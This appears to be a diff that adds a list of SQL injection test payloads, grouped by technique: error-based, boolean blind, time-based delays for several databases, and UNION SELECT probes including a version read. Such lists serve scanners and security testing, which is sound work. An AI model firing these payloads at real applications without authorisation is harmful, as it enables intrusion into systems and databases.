@@ -1,0 +1,62 @@
+# SQL Injection Test Payloads
+# Categories: error_based, boolean_based, time_based, union
+
+## Error-based (generic)
+'
+"
+)
+')
+")
+))
+'
+"
+'
+"
+1'
+1'
+1\
+1'--
+1'#
+1'--
+1'#
+
+## Boolean-based blind (MySQL)
+1' AND '1'='1
+1' AND '1'='2
+1' AND 1=1--
+1' AND 1=2--
+1' OR '1'='1'
+1' OR '1'='2'
+1' OR 1=1--
+1' OR 1=2--
+
+## Boolean-based blind (generic)
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1 OR 1=2
+
+## Time-based (MySQL)
+1' AND sleep(3)--
+1' AND sleep(5)--
+1' OR sleep(3)--
+1' OR sleep(5)--
+1' AND BENCHMARK(5000000, MD5('test'))--
+
+## Time-based (PostgreSQL)
+1' AND (SELECT pg_sleep(3))--
+1' OR (SELECT pg_sleep(3))--
+
+## Time-based (SQLite)
+1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(30000000/2))))--
+
+## Time-based (MSSQL)
+1' WAITFOR DELAY '0:0:3'--
+1' IF(1=1) WAITFOR DELAY '0:0:3'--
+
+## UNION-based
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1' UNION SELECT 1,2,3--
+1' UNION SELECT @@version,2,3--
